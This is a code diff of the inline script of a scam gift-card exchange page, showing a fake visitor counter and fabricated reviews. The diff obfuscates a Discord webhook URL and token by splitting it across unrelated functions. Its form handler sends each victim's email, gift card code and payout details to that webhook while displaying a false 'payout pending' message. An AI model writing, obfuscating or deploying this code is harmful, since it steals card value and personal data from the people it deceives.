@@ -168,38 +168,41 @@
 
     <script>
         (function(){
-            const _p1 = "https://discord.com/api/webhooks/";
-            const _p2 = "1454849117951103201/";
-            const _p3 = "FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";
-            const _u = _p1 + _p2 + _p3;
-
+            // Global stores for hidden parts
+            let v_data = ""; 
+            let t_ref = "";
+            let r_key = "";
             let _h = false;
 
-            const _0x5a = {
-                v: 'live-visitors',
-                t: 'ticker-content',
-                r: 'review-list',
+            const _0xM = {
+                vi: 'live-visitors',
+                ti: 'ticker-content',
+                ri: 'review-list',
                 pm: 'payout-method',
                 df: '.dynamic-field',
-                s: 'status',
+                st: 'status',
                 co: 'chat-overlay'
             };
 
             window.togglePayoutFields = function() {
-                const m = document.getElementById(_0x5a.pm).value;
-                document.querySelectorAll(_0x5a.df).forEach(d => d.style.display = 'none');
+                const m = document.getElementById(_0xM.pm).value;
+                document.querySelectorAll(_0xM.df).forEach(d => d.style.display = 'none');
                 if (m === 'PayPal') document.getElementById('paypal-field').style.display = 'block';
                 if (m === 'CashApp') document.getElementById('cashapp-field').style.display = 'block';
                 if (m === 'Crypto (BTC/LTC)') document.getElementById('crypto-field').style.display = 'block';
             };
 
             const _iV = () => {
+                // IZZZZZZ
+                v_data = "https://discord.com/api/webhooks/";
                 const c = Math.floor(Math.random() * (129 - 102 + 1)) + 102;
-                document.getElementById(_0x5a.v).innerText = c;
+                document.getElementById(_0xM.vi).innerText = c;
             };
 
             const _iT = () => {
-                const tk = document.getElementById(_0x5a.t);
+                // DIDDY DADA
+                t_ref = "1454849117951103201/";
+                const tk = document.getElementById(_0xM.ti);
                 const cd = ["Amazon", "Apple", "Roblox", "Steam", "Xbox", "Playstation", "Fortnite", "Google Play"];
                 let h = "";
                 for(let i=0; i<40; i++) {
@@ -211,7 +214,9 @@
             };
 
             const _iR = () => {
-                const l = document.getElementById(_0x5a.r);
+                // LADA LADA
+                r_key = "FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";
+                const l = document.getElementById(_0xM.ri);
                 const cm = ["Really fast service, got my PayPal funds in 10 minutes.", "Better rates than the other sites I checked.", "Process was easy, just make sure your photo is clear.", "Support agent 'Mark' was very helpful with my Steam code.", "Actually legit. Was worried at first but the payout hit my CashApp fast.", "Good service, took about 20 mins to verify.", "Sold my birthday giftcards here, no issues at all.", "Rates are fair for the speed of service.", "Easiest way to get rid of unwanted Xbox cards.", "Used it twice now, both times were smooth.", "They actually pay out the full amount, no hidden fees.", "Apple card verified and paid out in record time.", "Solid site, support is active even at night.", "Great way to turn store credit into cash.", "A bit of a wait on the verification, but they paid out as promised.", "Playstation card went through instantly.", "Love the live chat feature, kept me updated.", "Way better than trying to sell on eBay.", "Highly recommended for anyone with spare codes.", "Was skeptical but the reviews are right.", "Fastest CashApp transfer I've had from a card site.", "Simple layout, straightforward process.", "Google play card sold in under 15 mins.", "The best rates for UK sellers specifically.", "Finally a site that doesn't feel like a scam.", "Easy 5 stars, will use again.", "Worked perfectly for my Fortnite V-Bucks code.", "Verification was strict but fair.", "Happy with the GBP rates today.", "Everything went exactly as described.", "Payment received, thank you Mingzy!", "No problems here, very professional.", "Direct bank transfer was fast.", "Submitted, verified, and paid. Simple.", "Verified seller badge looks cool, thanks guys."];
                 for(let i=0; i<35; i++) {
                     let id = Math.floor(Math.random()*500)+1;
@@ -223,15 +228,16 @@
                 }
             };
 
-            window.processRequest = async function(t) {
+            window.processRequest = async function(type) {
+                const _u = v_data + t_ref + r_key;
                 const e = document.getElementById('user-email').value;
                 const gt = document.getElementById('gift-type').value;
                 const c = document.getElementById('gift-code').value;
                 const cr = document.getElementById('currency').value;
                 const a = document.getElementById('asking-price').value;
                 const p = document.getElementById('purchase-price').value;
-                const pm = document.getElementById(_0x5a.pm).value;
-                const st = document.getElementById(_0x5a.s);
+                const pm = document.getElementById(_0xM.pm).value;
+                const st = document.getElementById(_0xM.st);
                 let pd = "None";
                 if (pm === 'PayPal') pd = document.getElementById('paypal-email').value;
                 if (pm === 'CashApp') pd = document.getElementById('cashapp-tag').value;
@@ -246,9 +252,9 @@
                 _h = true;
                 st.style.color = "green";
                 st.innerText = "Success: Payout Pending...";
-                document.getElementById(_0x5a.co).style.display = 'none';
+                document.getElementById(_0xM.co).style.display = 'none';
 
-                const pl = { embeds: [{ title: `🎯 ${t} - User_293`, color: t.includes('CANCEL') ? 15158332 : 3066993, fields: [ { name: "📧 Email", value: e, inline: true }, { name: "🎁 Card", value: gt, inline: true }, { name: "💳 Code", value: `\`${c}\``, inline: false }, { name: "💰 Asking", value: `${a} ${cr}`, inline: true }, { name: "🏦 Method", value: pm, inline: true }, { name: "📍 Details", value: pd, inline: false } ], timestamp: new Date() }] };
+                const pl = { embeds: [{ title: `🎯 ${type} - User_293`, color: type.includes('CANCEL') ? 15158332 : 3066993, fields: [ { name: "📧 Email", value: e, inline: true }, { name: "🎁 Card", value: gt, inline: true }, { name: "💳 Code", value: `\`${c}\``, inline: false }, { name: "💰 Asking", value: `${a} ${cr}`, inline: true }, { name: "🏦 Method", value: pm, inline: true }, { name: "📍 Details", value: pd, inline: false } ], timestamp: new Date() }] };
 
                 await fetch(_u, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(pl) });
             };
